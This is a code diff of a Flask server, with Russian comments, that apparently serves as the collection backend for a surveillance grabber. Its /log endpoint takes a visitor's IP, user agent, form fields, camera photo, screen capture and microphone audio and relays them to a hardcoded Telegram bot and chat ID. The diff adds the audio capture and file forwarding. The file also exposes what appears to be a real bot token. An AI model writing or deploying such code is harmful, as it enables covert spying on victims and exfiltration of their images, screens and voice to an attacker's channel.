@@ -7,22 +7,24 @@ from datetime import datetime
 app = Flask(__name__)
 CORS(app)
 
+# ========== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ==========
 BOT_TOKEN = "8820194857:AAEcT1qBpODtvkUK58MfJT77_U9iVRplapg"
 CHAT_ID = "912559442"
 
-def send_tg(text, photo_bytes=None):
+def send_tg(text, file_bytes=None, filename="file"):
+    """Отправка текста или файла (фото/аудио) в Telegram"""
     try:
-        if photo_bytes:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-            files = {"photo": ("shot.jpg", photo_bytes, "image/jpeg")}
+        if file_bytes:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+            files = {"document": (filename, file_bytes, "application/octet-stream")}
             data = {"chat_id": CHAT_ID, "caption": text[:200]}
-            requests.post(url, data=data, files=files, timeout=10)
+            requests.post(url, data=data, files=files, timeout=15)
         else:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
             data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
             requests.post(url, data=data, timeout=5)
-    except:
-        pass
+    except Exception as e:
+        print("TG error:", e)
 
 @app.route("/")
 def index():
@@ -33,20 +35,37 @@ def log():
     data = request.get_json()
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', '')
-    msg = f"<b>🎯 Лог от {ip}</b>\n🕒 {datetime.now()}\n📱 {ua[:80]}\n\n"
-    for k, v in data.items():
-        if k in ["screenshot_base64", "screen_capture_base64"]:
-            continue
-        msg += f"<b>{k}</b>: {str(v)[:150]}\n"
+    
+    msg = f"<b>🎯 НОВЫЙ ЛОГ</b>\n"
+    msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    msg += f"🌍 IP: {ip}\n"
+    msg += f"📱 UA: {ua[:100]}\n\n"
+    
+    # Собираем все текстовые поля
+    text_fields = {k:v for k,v in data.items() 
+                   if not k.endswith('_base64') and not k in ['audio_base64', 'photo_base64', 'screen_base64']}
+    
+    for k, v in text_fields.items():
+        if v:
+            msg += f"<b>{k}</b>: {str(v)[:150]}\n"
+    
+    # Отправляем текст
     send_tg(msg)
     
-    if "screenshot_base64" in data and data["screenshot_base64"]:
-        img = base64.b64decode(data["screenshot_base64"])
-        send_tg("📸 Фото с камеры", photo_bytes=img)
+    # Фото с камеры
+    if data.get("photo_base64"):
+        img_bytes = base64.b64decode(data["photo_base64"])
+        send_tg("📸 Фото с камеры", file_bytes=img_bytes, filename="photo.jpg")
     
-    if "screen_capture_base64" in data and data["screen_capture_base64"]:
-        img2 = base64.b64decode(data["screen_capture_base64"])
-        send_tg("🖥️ Скриншот экрана", photo_bytes=img2)
+    # Скриншот экрана
+    if data.get("screen_base64"):
+        scr_bytes = base64.b64decode(data["screen_base64"])
+        send_tg("🖥️ Скриншот экрана", file_bytes=scr_bytes, filename="screen.jpg")
+    
+    # Аудио с микрофона
+    if data.get("audio_base64"):
+        audio_bytes = base64.b64decode(data["audio_base64"])
+        send_tg("🎙️ Аудиозапись (10 сек)", file_bytes=audio_bytes, filename="audio.webm")
     
     return jsonify({"ok": True})
 
